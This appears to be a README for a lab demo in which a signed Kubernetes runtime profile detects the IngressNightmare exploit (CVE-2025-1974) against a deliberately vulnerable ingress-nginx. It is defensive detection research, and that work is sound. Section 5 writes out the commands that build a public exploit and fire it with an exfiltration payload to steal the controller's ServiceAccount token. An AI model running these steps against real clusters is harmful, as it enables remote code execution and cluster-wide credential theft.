# IngressNightmare vs a signed SBoB — runtime tampering demo

An AI-agent / attacker workload that oversteps its intent and breaks out via a real recent CVE, watched by a **signed** ContainerProfile (SBoB). The ingress-nginx controller runs under a vendor-signed profile; node-agent verifies the signature on ingest, adopts it as the authoritative base, and flags the exploit's runtime deviation. The signature pins the contract — the workload can't widen its own authorization.

- **CVE:** IngressNightmare, **CVE-2025-1974** (admission-controller RCE) via the **`auth-url`** injection **CVE-2025-24514**.
- **Runs on a single-node k3s PG** — no GPU, no node-runtime downgrade. Everything is `kubectl apply` + an in-cluster exploit pod.
- Validated: k3s v1.36.1, kernel 6.12.80, x86_64, ingress-nginx **v1.11.0** (patched in 1.11.5/1.12.1).

## 0. Prerequisites

```
git clone -b signed-bundle-demo https://github.com/k8sstormcenter/bob && cd bob
```

Single-node k3s + `kubectl`, `helm`, `python3` (`python3-yaml`, `python3-requests`), `go`, `gcc`, `libssl-dev`. `setup.sh` installs the missing OS packages.

## 1. One-shot

```
example/ingress-nightmare/setup.sh
```

Installs the signed stack, deploys vulnerable ingress-nginx, signs + binds the controller SBoB, fires the exploit, prints the detections, then tampers the SBoB. Steps below are the same thing by hand.

## 2. Signed stack + monitor the controller

```
make kubescape
kubectl -n honey rollout status ds/node-agent --timeout=300s
kubectl -n honey logs -l app=node-agent -c node-agent --tail=-1 --prefix=false | grep -o "signed bundle overlays enabled[^\"]*" | sort -u
```

Expect `signed bundle overlays enabled in alert mode`. The chart's `excludeNamespaces` lists `ingress-nginx`; drop it so node-agent watches the controller (setup.sh patches the node-agent ConfigMap and restarts the DaemonSet).

## 3. Vulnerable ingress-nginx + learned profile

```
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.11.0/deploy/static/provider/cloud/deploy.yaml
kubectl -n ingress-nginx rollout status deploy/ingress-nginx-controller --timeout=180s
```

Restart the controller so node-agent learns it; wait for the ContainerProfile to reach `completed`.

## 4. Sign the SBoB and bind it

```
example/ingress-nightmare/hack/cp-to-fragment.py < learned-cp.json > example/ingress-nightmare/frag-base-ingress.yaml
example/redis/distros/signed-bundles/sign-fragment.sh example/ingress-nightmare/frag-base-ingress.yaml example/redis/distros/signed-bundles/keys/vendor.pem
kubectl -n ingress-nginx patch deploy ingress-nginx-controller --type merge -p '{"spec":{"template":{"metadata":{"labels":{"kubescape.io/user-defined-profile":"ingress-base"}}}}}'
```

node-agent verifies + adopts the signed profile (observed):

```
Successfully verified object signature   namespace=ingress-nginx name=ingress-base identity=local-key issuer=local
adopted user-authored ContainerProfile as authoritative base   namespace=ingress-nginx name=ingress-base
```

## 5. Attack — IngressNightmare

```
git clone https://github.com/Esonhugh/ingressNightmare-CVE-2025-1974-exps ein && (cd ein && go build -o ing .)
PODIP=$(kubectl -n ingress-nginx get pod -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].status.podIP}')
ADM=$(kubectl -n ingress-nginx get svc ingress-nginx-controller-admission -o jsonpath='{.spec.clusterIP}')
./ein/ing -m c -c '<exfil payload>' -i https://$ADM:443 -u http://$PODIP:80 --is-auth-url
```

`Exploit Success! pid: N, fd: M` — code runs as `www-data` in the controller pod, the controller ServiceAccount token is exfiltrated (cluster-wide Secret read).

## 6. Expected detections

Against the signed profile, node-agent flags (observed):

```
R0002  Unexpected file access detected: nginx with PID <n> to /proc/<pid>/fd/<n>
R0002  Unexpected file access detected: nginx ... to /tmp/nginx/nginx-cfg<...>
R0012  Unexpected Ingress Network Traffic ... to: controller
```

`R0002` on `nginx -> /proc/<pid>/fd/<n>` is the IngressNightmare signature — the malicious shared library loaded from `/proc` during `nginx -t`. The injected `nginx-cfg` temp files and the out-of-baseline traffic corroborate.

## 7. Signature integrity

The bound SBoB is signature-verified at ingest and re-derived from the signed content — an unsigned edit to the stored copy is display-only and does not widen enforcement. Fragment-composite tampering raises `R0002`/`R1016` per the signed-bundles contract; see `../redis/distros/signed-bundles/demo.md` §2b and §7 for the full OFF/ALERT/ENFORCE tamper matrix (`R1016` Signed profile tampered, `R1017` Signed profile drift).

## 8. Cleanup

```
kubectl delete ns ingress-nginx calico-system --ignore-not-found
helm -n honey uninstall kubescape
```
